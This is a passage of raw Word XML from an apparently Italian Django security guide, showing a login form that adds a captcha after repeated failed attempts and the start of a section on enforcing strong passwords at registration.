            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>LoginForm</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>forms.Form</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2691D3CC"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email = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>forms.EmailField</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="437701A4"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password = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>forms.CharField</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(widget=</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>forms.PasswordInput</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4786C3D3" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="181347ED"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def __</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>init</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>_</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>_(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>self, *</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>args</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>, **</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>kwargs</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36BB1382"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w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>show_captcha</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>kwargs.pop</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>"</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>show_captcha</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>", False)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41E835D9"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w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>super()._</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>_</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>init</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>_</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>_(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>*</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>args</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>, **kwargs)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04669496"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if </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>show_captcha</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05A2D679" w14:textId="6E5EEE4B" w:rsidR="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">            </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>self.fields</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">["captcha"] = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>CaptchaField</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="336FBA0E" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRDefault="00E603E1"/>
    <w:p w14:paraId="611C9313" w14:textId="24AC6E22" w:rsidR="00E603E1" w:rsidRDefault="00E603E1">
      <w:r w:rsidRPr="00E603E1">
        <w:t>View:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Grigliatabella"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="38" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9932"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E603E1" w14:paraId="7ADF3D9E" w14:textId="77777777" w:rsidTr="00E603E1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9932" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
          </w:tcPr>
          <w:p w14:paraId="5932BBD9"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show = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>cache.get</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>"login_attempts</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>_{</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>request.POST.get</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>('email</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>')}</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>", 0) &gt;= 3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B90537A" w14:textId="0A5D4B21" w:rsidR="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">form = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>LoginForm</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>request.POST</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>show_captcha</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>=show)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="29EA6D32" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRDefault="00E603E1"/>
    <w:p w14:paraId="12E79624" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>4. Forzare password forti in registrazione</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59779128" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">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Descrizione</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B08A091" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Richiedere password complesse (minimo </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> caratteri, mix di lettere, numeri, simboli).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7504D03C" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Esempio </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>validator</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Grigliatabella"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="38" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9932"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E603E1" w14:paraId="34CEEF1B" w14:textId="77777777" w:rsidTr="00E603E1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9932" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
          </w:tcPr>
          <w:p w14:paraId="506EA336"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from </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>django.core</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>.exceptions</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> import </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>ValidationError</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
          <w:p w14:paraId="3F7827EF" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7FA0C314"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def </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>validate_strong_password</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(password):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5568CC80"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if </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>len</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">(password) &lt; 8 or </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>password.isalpha</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">() or </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>password.isnumeric</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>():</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="307A3C9E"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        raise </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>ValidationError</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">"Password non </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
